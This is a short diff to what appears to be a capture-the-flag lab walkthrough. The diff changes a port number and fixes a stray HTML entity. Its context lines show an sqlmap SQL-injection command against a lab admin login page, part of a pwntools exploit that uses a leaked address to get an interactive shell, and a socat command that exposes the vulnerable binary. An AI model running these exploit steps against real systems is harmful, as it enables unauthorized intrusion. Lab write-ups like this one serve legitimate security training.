@@ -25,7 +25,7 @@ sqlmap -u 'http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php' 
 #!/usr/bin/python3
 from pwn import *
 
-shell = remote('10.13.37.10', 4444)
+shell = remote('10.13.37.10', 9999)
 shell.recvuntil(b"Oops, I'm leaking! ")
 
 leaking = int(shell.recvuntil(b"\n"),16)
@@ -41,5 +41,5 @@ shell.interactive()
 ```
 8) Expose the binary using socat and launch the exploit
 ```bash
-socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &amp
+socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &amp;
 ```
